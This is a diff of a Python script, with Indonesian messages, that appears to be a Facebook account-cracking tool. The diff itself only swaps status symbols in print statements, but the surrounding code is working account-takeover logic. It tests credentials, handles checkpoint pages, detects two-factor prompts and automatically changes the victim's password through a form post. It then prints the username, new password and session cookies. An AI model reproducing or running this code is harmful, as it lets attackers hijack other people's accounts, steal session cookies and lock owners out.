@@ -285,7 +285,7 @@ def cek_opsi(user,pw):
 				if "y" in ubahP:
 					ubah_pw(user,pw,session,response,link2)
 				else:
-					print("\r [-] akun tap yes, silahkan login di fb lite \n %s[✓] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
+					print("\r [-] akun tap yes, silahkan login di fb lite \n %s[-] %s|%s|%s%s									\n"%(H,user,pwbaru,coki[0],N))
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
 				print("\r %s[!] akun terpasang autentikasi dua faktor%s							\n"%(M,N))
 			else:
@@ -328,7 +328,7 @@ def ubah_pw(user,pw,session,response,link2):
 		dat2.update({"password_new":"".join(pwbaru)})
 		an=session.post(url+link3.get("action"),data=dat2)
 		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-		print("\r [✓] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[✓] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
+		print("\r [-] akun tap yes, silahkan login di fb lite \n [*] sandi telah diubah ke : %s \n %s[-] %s|%s|%s%s									\n"%(pwbaru[0],H,user,pwbaru[0],coki,N))
 		cek_apk(coki)
 		
 def cek_apk(coki):
@@ -793,7 +793,7 @@ def ceker(uid,pw,ua):
 		for opt in range(len(ngew)):
 			print("  "+N+"["+str(opt+1)+"]. "+ngew[opt]+" ")
 		if "0" in str(len(ngew)):
-			print("\r %s[✓] akun tap yes, login di lite       "%(H))
+			print("\r %s[-] akun tap yes, login di lite       "%(H))
 	elif "login_error" in str(run):
 		print("\r %s[CP] %s|%s        "%(K,uid, pw))
 	else:
